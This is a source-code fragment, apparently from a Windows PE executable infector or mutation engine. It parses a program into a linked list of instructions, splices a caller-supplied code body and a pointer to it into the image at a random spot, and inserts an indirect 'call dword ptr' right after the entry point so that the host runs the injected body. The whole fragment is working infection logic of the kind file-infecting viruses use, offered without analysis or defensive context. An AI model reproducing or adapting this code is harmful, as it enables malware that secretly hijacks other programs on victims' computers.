
/*
      call dword ptr x
x     dd body
*/

  // insert body

  for (int pass=0, count=0; pass<2; pass++)
  {
    for (hooy* h=root; h; h=h->next)
    if (h->flags & FL_STOP)
    if (!(h->next->flags & FL_FIXUP))
    {
      if (pass == 0)
        count++;
      else
      if (count-- == 0)
      {
#ifdef DUMP_MSG
        printf("<body>\n");
#endif

        hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        if (z1==0) return ERR_NOMEMORY;
        z1->flags = FL_LABEL | FL_DREF | FL_PRESENT | FL_VPRESENT;
        z1->oldrva = 1;
        z1->datalen = 0;
        z1->dataptr = NULL;

        hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        if (z2==0) return ERR_NOMEMORY;
        z2->flags = FL_DATA | FL_PRESENT | FL_VPRESENT;
//      z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 256);
//      x_memset(z2->dataptr, 0xCC, z2->datalen);
//      z2->dataptr[1] = 0xC3;

        z2->datalen = *(DWORD*)(user_arg+0);
        z2->dataptr = (BYTE*)(*(DWORD*)(user_arg+4));

        z1->next = z2;
        z2->next = h->next;
        h->next = z1;

        break;
      } // count==0
    } // h
    if (pass == 0)
    {
      if (count == 0) return ERR_MUTATE;
      count = user_random(user_arg,count);
    }
  }//pass

  // insert DD body

  for (int pass=0, count=0; pass<2; pass++)
  {
    for (hooy* h=root; h; h=h->next)
//  if ((h->flags & FL_OPCODE) && (*(WORD*)&h->dataptr[0] == 0x25FF))
//  if (h->next->flags & FL_FIXUP)
    if (h->flags & FL_STOP)
    if (!(h->next->flags & FL_FIXUP))
    {
      if (pass == 0)
        count++;
      else
      if (count-- == 0)
      {
#ifdef DUMP_MSG
        printf("<DD body>\n");
#endif
        hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        if (z1==0) return ERR_NOMEMORY;
        z1->flags = FL_LABEL | FL_DREF | FL_PRESENT | FL_VPRESENT;
        z1->oldrva = 2;
        z1->datalen = 0;
        z1->dataptr = NULL;

        hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
        if (z2==0) return ERR_NOMEMORY;
        z2->flags = FL_FIXUP | FL_PRESENT | FL_VPRESENT;
        z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 4);
        if (z2->dataptr==0) return ERR_NOMEMORY;
        z2->arg1 = 1;

        z1->next = z2;
        z2->next = h->next;
        h->next = z1;

        break;
      }//count==0
    }//h
    if (pass == 0)
    {
      if (count == 0) return ERR_MUTATE;
      count = user_random(user_arg,count);
    }
  }//pass

  // insert CALL

  int j = 0, ok = 0;
  for (hooy* h=root, *h0=h; h; h0=h, h=h->next)
  {
    if (j == 0)
    if ( (h->oldrva == pe->pe_entrypointrva) &&
         (h->flags & FL_OPCODE) ) j = 1;

    if (j == 1)
    if (h->flags & FL_OPCODE)
    if (!(h->flags & (FL_HAVEREL|FL_FIXUP)))
    if ( (h->next->next->flags & FL_STOP) ||
         (h->next->next->next->flags & FL_STOP) ||
         (h->next->next->next->next->flags & FL_STOP) )
    {
#ifdef DUMP_MSG
      printf("<call>\n");
#endif
      hooy* z1 = (hooy*) user_malloc(user_arg,sizeof(hooy));
      if (z1==0) return ERR_NOMEMORY;
      z1->flags = FL_OPCODE | FL_CODE | FL_PRESENT | FL_VPRESENT;
      z1->dataptr = (BYTE*) user_malloc(user_arg,z1->datalen = 2);
      if (z1->dataptr==0) return ERR_NOMEMORY;
      z1->dataptr[0] = 0xFF; // call dword ptr [...]
      z1->dataptr[1] = 0x15;

      hooy* z2 = (hooy*) user_malloc(user_arg,sizeof(hooy));
      if (z2==0) return ERR_NOMEMORY;
      z2->flags = FL_FIXUP | FL_CODE | FL_PRESENT | FL_VPRESENT;
      z2->dataptr = (BYTE*) user_malloc(user_arg,z2->datalen = 4);
      if (z2->dataptr==0) return ERR_NOMEMORY;
      z2->arg1 = 2;

      z1->next = z2;
      z2->next = h0->next;
      h0->next = z1;

      ok++;
      break;
    }
  }
  if (!ok) return ERR_MUTATE;

